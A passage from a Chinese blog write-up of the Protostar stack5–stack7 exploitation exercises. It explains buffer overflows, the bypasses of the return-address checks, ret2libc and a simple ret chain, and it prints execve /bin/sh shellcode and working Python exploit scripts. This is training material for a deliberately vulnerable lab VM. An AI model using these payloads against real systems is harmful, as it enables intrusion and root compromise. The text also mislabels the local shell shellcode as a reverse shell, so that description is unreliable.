<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>可以看到这个源码已经很简单了，那么我们要如何做呢？在该网站上给出了目标：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=n>Stack5</span> <span class=n>is</span> <span class=n>a</span> <span class=n>standard</span> <span class=n>buffer</span> <span class=n>overflow</span><span class=p>,</span> <span class=k>this</span> <span class=n>time</span> <span class=n>introducing</span> <span class=n>shellcode</span><span class=p>.</span>

<span class=n>This</span> <span class=n>level</span> <span class=n>is</span> <span class=n>at</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>protostar</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>stack5</span>

<span class=nl>Hints</span><span class=p>:</span>

<span class=n>At</span> <span class=k>this</span> <span class=n>point</span> <span class=n>in</span> <span class=n>time</span><span class=p>,</span> <span class=n>it</span> <span class=n>might</span> <span class=n>be</span> <span class=n>easier</span> <span class=n>to</span> <span class=n>use</span> <span class=n>someone</span> <span class=n>elses</span> <span class=n>shellcode</span>
<span class=n>If</span> <span class=n>debugging</span> <span class=n>the</span> <span class=n>shellcode</span><span class=p>,</span> <span class=n>use</span> <span class=err>\</span><span class=n>xcc</span> <span class=p>(</span><span class=n>int3</span><span class=p>)</span> <span class=n>to</span> <span class=n>stop</span> <span class=n>the</span> <span class=n>program</span> <span class=n>executing</span> <span class=n>and</span> <span class=k>return</span> <span class=n>to</span> <span class=n>the</span> <span class=n>debugger</span>
<span class=n>remove</span> <span class=n>the</span> <span class=n>int3s</span> <span class=n>once</span> <span class=n>your</span> <span class=n>shellcode</span> <span class=n>is</span> <span class=n>done</span><span class=p>.</span>
</code></pre></td></tr></table>
</div>
</div><p>因此我们需要利用栈溢出漏洞来执行我们自己的shellcode，那么思路是什么呢？</p>
<p>首先要执行到shellcode，那么前提就是我们的eip寄存器指向了我们shellcode的起始地址。那么在该程序中要如何控制eip寄存器呢？很明显可以通过ret指令实现，我们可以通过覆盖返回地址为shellcode地址，当程序成功返回后，eip就指向了shellcode的地址。</p>
<p>那么就直接确定返回地址被保存的地址了。首先在ret指令上打上断点，断点命中后查看栈情况：</p>
<div>
<center>
<img src=1-19.png alt=1-19.png style=100%>
<br>
Picture 1-19
</center>
</div>
<p>因为在执行leave指令后，esp就指向了返回地址的起始地址，因此当前返回地址保存在0xbfffc9c中。</p>
<p>我们可以考虑一种最简单的shellcode插入方法，即将返回地址的下一地址作为shellcode的起始地址。这样做的话，我们的输入就可以这样构造了：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=n>payload</span> <span class=o>=</span> <span class=s>&#34;A&#34;</span><span class=o>*</span><span class=mi>76</span> <span class=o>+</span> <span class=mh>0xbffffc10</span><span class=p>(</span><span class=err>返回地址的下一地址</span><span class=p>)</span> <span class=o>+</span> <span class=n>shellcode</span>
</code></pre></td></tr></table>
</div>
</div><p>因此当ret指令执行后将会返回0xbffffc10地址，然后eip也将指向该地址，而该地址正是我们的shellcode起始地址，因此就能实现shellcode的执行了。</p>
<p>那么shellcode该如何写呢？这里介绍一个最简单的反弹shell的shellcode。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=err>31</span> <span class=nf>c0</span>             <span class=no>xor</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>    <span class=c># eax = 0
</span><span class=c></span><span class=mi>50</span>                <span class=no>push</span> <span class=no>eax</span>
<span class=err>68</span> <span class=err>2</span><span class=nf>f</span> <span class=mi>2</span><span class=no>f</span> <span class=mi>73</span> <span class=mi>68</span>    <span class=no>push</span> <span class=mi>0x68732f2f</span>  <span class=c>#将/bin//sh字符串入栈
</span><span class=c></span><span class=mi>68</span> <span class=mi>2</span><span class=no>f</span> <span class=mi>62</span> <span class=mi>69</span> <span class=mi>6</span><span class=no>e</span>    <span class=no>push</span> <span class=mi>0x6e69622f</span>  
<span class=mi>89</span> <span class=no>e3</span>             <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>    <span class=c># ebx = esp，就是将字符串起始地址保存在ebx中，当作execve函数运行的参数
</span><span class=c></span><span class=mi>89</span> <span class=no>c1</span>             <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>eax</span>    <span class=c># ecx = 0
</span><span class=c></span><span class=mi>89</span> <span class=no>c2</span>             <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span><span class=no>eax</span>    <span class=c># edx = 0
</span><span class=c></span><span class=no>b0</span> <span class=mi>0</span><span class=no>b</span>             <span class=no>mov</span> <span class=no>al</span><span class=p>,</span><span class=mi>0xb</span>     <span class=c># execve的系统调用号
</span><span class=c></span><span class=no>cd</span> <span class=mi>80</span>             <span class=no>int</span> <span class=mi>80</span>         <span class=c># 通过execve运行/bin/sh程序
</span><span class=c></span><span class=mi>31</span> <span class=no>c0</span>             <span class=no>xor</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>    <span class=c># eax = 0
</span><span class=c></span><span class=mi>40</span>                <span class=no>inc</span> <span class=no>eax</span>        <span class=c># sys_exit系统调用号
</span><span class=c></span><span class=no>cd</span> <span class=mi>80</span>             <span class=no>int</span> <span class=mi>80</span>         <span class=c># 退出当前进程
</span></code></pre></td></tr></table>
</div>
</div><p>这个程序就是将/bin/sh程序通过execve运行起来，然后当前程序通过sys_exit结束运行。这里使用/bin//sh而不是/bin/sh是因为linux的机制，如果是"/bin/sh" 那么execve就会将其解析为"/bin/sh"与" &ldquo;，NULL作为execve的第二个参数的内容，而第二个参数是命令行参数列表，是一个指针，而空指针将导致错误。如果是/bin//sh，execve解析参数列表时，它将只会解析成一个元素，即&rdquo;/bin//sh"。也就是相当于再说明，"/bin//sh"是一个路径，而不是一个要被指令的命令。如果输入的是"/bin/sh"就相当于是一个要被执行的命令，而" &ldquo;就是这个命令的参数，为空就会导致空指针问题。</p>
<p>根据上面分析的，脚本代码应该如下：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>buffer</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>76</span>

<span class=n>ret_add</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\xA0\xfc\xff\xbf</span><span class=s2>&#34;</span>

<span class=n>shellcode</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class=s2>&#34;</span>

<span class=c1>#shellcode = &#34;\xcc&#34; * 8</span>

<span class=nb>print</span> <span class=n>buffer</span> <span class=o>+</span> <span class=n>ret_add</span> <span class=o>+</span> <span class=n>shellcode</span>
</code></pre></td></tr></table>
</div>
</div><p>运行结果如下，可以看到/bin/sh已经成功被运行了，并且能够正常运行命令，而且权限也为root级别：</p>
<div>
<center>
<img src=1-20.png alt=1-20.png style=100%>
<br>
Picture 1-20
</center>
</div>
<h6 id=0x117-stack6>0x117 stack6</h6>
<p>源码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>void</span> <span class=nf>getpath</span><span class=p>()</span>
<span class=p>{</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>ret</span><span class=p>;</span>

  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;input path please: &#34;</span><span class=p>);</span> <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>

  <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>

  <span class=n>ret</span> <span class=o>=</span> <span class=n>__builtin_return_address</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>

  <span class=k>if</span><span class=p>((</span><span class=n>ret</span> <span class=o>&amp;</span> <span class=mh>0xbf000000</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0xbf000000</span><span class=p>)</span> <span class=p>{</span>
    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;bzzzt (%p)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ret</span><span class=p>);</span>
    <span class=n>_exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
  <span class=p>}</span>

  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;got path %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buffer</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=n>getpath</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>在这道题中，与之前的题不一样的是这里进行了一个返回地址的判断。</p>
<p>__builtin_return_address(0)函数获取了当前函数的返回地址，然后将当前函数的返回地址进行一个判断，判断该返回地址是否位于0xbf000000 - 0xbfffffff地址之间。</p>
<p>这里额外提一下，如果是__builtin_return_address(1)，那就是返回调用当前函数的函数的返回地址，即fun1->fun2->fun3，返回了fun2的返回地址；如果是__builtin_return_address(2)，那就是返回调用了调用当前函数的函数的函数的返回地址，即fun1->fun2->fun3，就是返回了fun1的返回地址。</p>
<p>那么为什么判断是否在0xbf000000 - 0xbfffffff地址之间呢？这就需要下看一下该程序的内存分布情况了。</p>
<div>
<center>
<img src=1-21.png alt=1-21.png style=100%>
<br>
Picture 1-21
</center>
</div>
<p>可以给程序打个断点，然后运行起来，便可以使用info proc map查看该进程的内存分布。</p>
<p>在最后一排，我们可以看到stack的地址范围为0xbffeb000 - 0xc0000000.因此获取返回地址并判断是否在0xbf000000 - 0xbfffffff是为了检查程序的返回地址是否被更改到成了栈地址。也就是检查是否使用了stack5中的shellcode注入方法。</p>
<p>那么这要如何绕过检查呢？当然可以直接patch掉该if就可以绕过了，但为了训练pwn的技术，我们可以换个思路。</p>
<p>第一种方法就是多进行一次ret。这怎么理解呢？如果我们将返回地址修改为ret指令的地址，那么这并不会让返回地址位于栈地址中，同时将保存返回地址的下一个栈地址修改成shellcode的起始位置，而shellcode还是可以写在栈中。这样就可以绕过if的判断了。</p>
<p>根据图1-22所示，将0xbffffc8c地址内容(正常的返回地址)修改为0x80484f9，0xbffffc90地址内容修改为0xbffffc94，而0bffffc94就可以开始填入shellcode了。</p>
<div>
<center>
<img src=1-22.png alt=1-22.png style=100%>
<br>
Picture 1-22
</center>
</div>
<p>那么得到的exp脚本如下：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>80</span>
<span class=n>address</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\xf9\x84\x04\x08</span><span class=s2>&#34;</span>
<span class=n>address</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x94\xfc\xff\xbf</span><span class=s2>&#34;</span>
<span class=n>shellcode</span> <span class=o>=</span>  <span class=s2>&#34;</span><span class=se>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class=s2>&#34;</span>

<span class=nb>print</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>address</span> <span class=o>+</span> <span class=n>shellcode</span>
</code></pre></td></tr></table>
</div>
</div><p>运行的结果：</p>
<div>
<center>
<img src=1-23.png alt=1-23.png style=100%>
<br>
Picture 1-23
</center>
</div>
<p>虽然在栈上插入可执行代码很方便，但也正因为很容易利用，在现代的操作系统上已经禁止了在栈上执行代码。因此绝大部分情况下，我们是无法在栈中插入我们的shellcode的。</p>
<p>那这也引出了另一种办法，这种办法被称为ret2libc.</p>
<p>正如execve函数可以执行命令一样，在libc中还有system函数可以用于执行shell命令，因此思路也很简单，直接跳转到system函数地址开始执行不就行了？确实是这样，但我们还需要为system函数准备参数，也即/bin/sh字符串。</p>
<p>因此我们需要获取system函数地址，以及从libc库中获取&rdquo;/bin/sh"字符串的地址。</p>
<p>由图1-24可以获得，libc被载入的基地址为0xb7e97000，system函数地址为0xb7ecffb0，而"/bin/sh"字符串在libc-2.11.2.so中的偏移为0x11f3bf。</p>
<div>
<center>
<img src=1-24.png alt=1-24.png style=100%>
<br>
Picture 1-24
</center>
</div>
<p>因为system函数的地址不再栈地址范围，因此可以直接将返回地址修改成system的地址，接着就是system函数返回地址，以及该函数的参数：</p>
<div>
<center>
<img src=1-25.png alt=1-25.png style=100%>
<br>
Picture 1-25
</center>
</div>
<p>那么可以直接写脚本了：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>struct</span>

<span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>80</span>
<span class=n>system_add</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\xb0\xff\xec\xb7</span><span class=s2>&#34;</span>
<span class=n>system_ret</span> <span class=o>=</span> <span class=s2>&#34;abcd&#34;</span>
<span class=n>binsh_add</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;I&#34;</span><span class=p>,</span><span class=mh>0xb7e97000</span> <span class=o>+</span> <span class=mh>0x11f3bf</span><span class=p>)</span>
<span class=nb>print</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>system_add</span> <span class=o>+</span> <span class=n>system_ret</span> <span class=o>+</span> <span class=n>binsh_add</span>
</code></pre></td></tr></table>
</div>
</div><p>运行结果如下：</p>
<div>
<center>
<img src=1-26.png alt=1-26.png style=100%>
<br>
Picture 1-26
</center>
</div>
<h6 id=0x116-stack7>0x116 stack7</h6>
<p>源码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp></span>
<span class=kt>char</span> <span class=o>*</span><span class=nf>getpath</span><span class=p>()</span>
<span class=p>{</span>
  <span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>ret</span><span class=p>;</span>

  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;input path please: &#34;</span><span class=p>);</span> <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>

  <span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>

  <span class=n>ret</span> <span class=o>=</span> <span class=n>__builtin_return_address</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>

  <span class=k>if</span><span class=p>((</span><span class=n>ret</span> <span class=o>&amp;</span> <span class=mh>0xb0000000</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0xb0000000</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>printf</span><span class=p>(</span><span class=s>&#34;bzzzt (%p)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ret</span><span class=p>);</span>
      <span class=n>_exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
  <span class=p>}</span>

  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;got path %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buffer</span><span class=p>);</span>
  <span class=k>return</span> <span class=n>strdup</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
<span class=p>{</span>
  <span class=n>getpath</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>这一题和上一题差距只是在于返回地址限制的范围变成了0xb0000000 - 0xbfffffff。如图1-27所示，查询一下该程序的内存分布发现，这个条件已经限制了之前我们使用的办法：</p>
<div>
<center>
<img src=1-27.png alt=1-27.png style=100%>
<br>
Picture 1-27
</center>
</div>
<p>但是我们还是可以通过修改函数的返回地址为ret指令的地址，这样还是可以绕过该检测机制。如图1-28所示，图中展示了getpath函数的ret指令地址，以及返回地址保存的栈地址。</p>
<div>
<center>
<img src=1-28.png alt=1-28.png style=100%>
<br>
Picture 1-28
</center>
</div>
<p>那么这个方法我们在stack6中的方法一就使用过了，因此这里直接展示exp脚本：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>80</span>
<span class=n>address</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x44\x85\x04\x08</span><span class=s2>&#34;</span>
<span class=n>address</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x94\xfc\xff\xbf</span><span class=s2>&#34;</span>
<span class=n>shellcode</span> <span class=o>=</span>  <span class=s2>&#34;</span><span class=se>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class=s2>&#34;</span>

<span class=nb>print</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>address</span> <span class=o>+</span> <span class=n>shellcode</span>
</code></pre></td></tr></table>
</div>
</div><p>结果如图1-29所示：</p>
<div>
<center>
<img src=1-29.png alt=1-29.png style=100%>
<br>
Picture 1-29
</center>
</div>
<p>上述的这个办法就是多了一个ret指令，那么我们就可以考虑能不能利用其他代码片段的ret指令呢？我们将该函数返回地址改为其他代码片段的ret指令地址，然后该ret指令的返回地址改为shellcode的地址不就同样可以实现吗？</p>
<p>因为目标程序很小，因此可以直接通过objdump寻找另一个ret指令。</p>
<p>上述说的方法其实就是ROP，但这里的ROP很简化，我们只需要利用其他地址的ret指令即可完成我们的目标，而真实的ROP构造甚至会需要利用已存在的指令来配合实现shellcode，这就会经历很多次跳转来执行位于不同地址的指令。</p>
<p>为了简化，我们仍然把代码存在栈里，然后两次ret即可。</p>
<p>通过objdump查看该程序的反汇编代码可以找到很多ret指令，随便用一个即可。</p>
<p>脚本代码如下所示，这里的区别只是将第一个address的地址赋值成存在于其他地址的ret指令，其他的都不变。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>80</span>
<span class=n>address</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\xf9\x85\x04\x08</span><span class=s2>&#34;</span>
<span class=n>address</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x94\xfc\xff\xbf</span><span class=s2>&#34;</span>
<span class=n>shellcode</span> <span class=o>=</span>  <span class=s2>&#34;</span><span class=se>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class=s2>&#34;</span>

<span class=nb>print</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>address</span> <span class=o>+</span> <span class=n>shellcode</span>
</code></pre></td></tr></table>
</div>
</div></div><div class=post-footer id=post-footer>
<div class=post-info>
<div class=post-info-line>
<div class=post-info-mod>
<span>更新于 2021-04-01</span>
</div>
<div class=post-info-license></div>
</div>
<div class=post-info-line>
<div class=post-info-md><span>
<a class=link-to-markdown href=/23-4-1/index.md target=_blank>阅读原始文档</a>
</span></div>
<div class=post-info-share>
<span></span>
</div>
</div>
</div>
<div class=post-info-more>
<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/pwn/>PWN</a></section>
<section>
<span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span>
</section>
</div>
<div class=post-nav>
<a href=/oslab1/ class=next rel=next title=操作系统的引导>操作系统的引导<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id=comments></div></article></div>
</main><footer class=footer>
<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>ShiDong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
</div>
</footer>
</div>
<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部>
<i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论>
<i class="fas fa-comment fa-fw"></i>
</a>
</div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
</html>